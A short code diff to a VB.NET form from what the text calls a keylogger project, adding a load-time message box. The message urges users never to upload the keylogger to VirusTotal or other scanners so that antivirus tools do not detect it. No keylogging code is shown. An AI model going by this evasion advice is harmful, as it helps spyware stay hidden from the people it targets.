@@ -147,4 +147,8 @@ Public Class Form1
     Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
         Process.Start("https://dotnet.microsoft.com/download/dotnet-framework")
     End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        MessageBox.Show("Every single line of keylogger has been written with hands," & vbNewLine & "Please Please Please Never upload to Virustotal or any other virus scanning site." & vbNewLine & "It will get detectable and will remain useless." & vbNewLine & "It will create difficulties for newbies but not for programmers..." & vbNewLine & "That's all truth I know and I have fullfil my responsibilty but now its your turn !!!", "Important Message")
+    End Sub
 End Class
